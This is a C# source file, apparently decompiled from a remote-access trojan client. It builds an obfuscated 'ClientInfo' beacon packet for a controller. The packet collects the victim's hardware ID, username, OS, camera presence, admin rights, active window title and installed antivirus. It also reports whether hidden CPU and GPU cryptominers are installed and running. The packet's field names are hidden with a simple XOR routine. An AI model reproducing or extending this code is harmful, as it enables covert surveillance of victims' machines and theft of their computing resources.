using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Text;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;
using Peg.Properties;

namespace Peg.ICARUS
{
	public static class IdSender
	{
		public static byte[] SendInfo()
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject(thebook("ZkiUao~")).AsString = thebook("Ifcod~Cdle");
			msgPack.ForcePathObject(thebook("B]CN")).AsString = Settings.Hw_id;
			msgPack.ForcePathObject(thebook("_yox")).AsString = Environment.UserName;
			msgPack.ForcePathObject(thebook("EY")).AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
			msgPack.ForcePathObject(thebook("Ikgoxk")).AsString = ToMati.havecamera().ToString();
			msgPack.ForcePathObject(thebook("Zk~b")).AsString = Process.GetCurrentProcess().MainModule.FileName;
			msgPack.ForcePathObject(thebook("\\oxyced")).AsString = Settings.Ver_sion;
			msgPack.ForcePathObject(thebook("Kngcd")).AsString = Me8odos.IsAdmin().ToString().ToLower()
				.Replace("true", "Admin")
				.Replace("false", "User");
			msgPack.ForcePathObject(thebook("ZoxlexUgkdio")).AsString = Me8odos.GetActiveWindowTitle();
			msgPack.ForcePathObject(thebook("Zky~oUhcd")).AsString = Settings.BinToGo;
			msgPack.ForcePathObject(thebook("Kd~cU|cx\u007fy")).AsString = Me8odos.Antivirus();
			msgPack.ForcePathObject(thebook("Cdy~kffUon")).AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
			msgPack.ForcePathObject(thebook("ZeUdm")).AsString = "";
			msgPack.ForcePathObject(thebook("Mxe\u007fz")).AsString = Settings.Group;
			msgPack.ForcePathObject("CPU/GPU").AsString = SYS();
			msgPack.ForcePathObject("GPU RAM").AsString = GetGPU_RAM.Get();
			msgPack.ForcePathObject("GPUCheck").AsString = StatsGPUMiner();
			msgPack.ForcePathObject("CPUCheck").AsString = StatsCPUMiner();
			return msgPack.Encode2Bytes();
		}

		public static string StatsCPUMiner()
		{
			try
			{
				if (!File.Exists(Peg.Properties.Settings.Default.cpuBin))
				{
					return "No Install";
				}
				if (Process.GetProcessesByName(Peg.Properties.Settings.Default.cpuProc).Length == 0)
				{
					return "Install";
				}
				return "WORK";
			}
			catch
			{
				return "Error Check";
			}
		}

		public static string StatsGPUMiner()
		{
			try
			{
				if (!File.Exists(Peg.Properties.Settings.Default.gpuBin))
				{
					return "No Install";
				}
				if (Process.GetProcessesByName(Peg.Properties.Settings.Default.gpuProc).Length == 0)
				{
					return "Install";
				}
				return "WORK";
			}
			catch
			{
				return "Error Check";
			}
		}

		public static string GetCoreCPU()
		{
			try
			{
				int num = 0;
				foreach (ManagementBaseObject item in new ManagementObjectSearcher("Select * from Win32_Processor").Get())
				{
					num += int.Parse(item["NumberOfCores"].ToString());
				}
				return num.ToString();
			}
			catch
			{
			}
			return "-1";
		}

		public static string SYP()
		{
			string result = "";
			foreach (ManagementObject item in new ManagementObjectSearcher("select * from Win32_VideoController").Get())
			{
				result = Convert.ToString(item["AdapterRAM"]);
			}
			return result;
		}

		public static string SYS()
		{
			string text = "";
			string text2 = "";
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
			foreach (ManagementObject item in new ManagementObjectSearcher("select * from Win32_Processor").Get())
			{
				text = Convert.ToString(item["Name"]);
				foreach (ManagementObject item2 in managementObjectSearcher.Get())
				{
					text2 = Convert.ToString(item2["Name"]);
				}
			}
			return text + "/Core:" + GetCoreCPU() + "/" + text2;
		}

		public static string thebook(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
	}
}
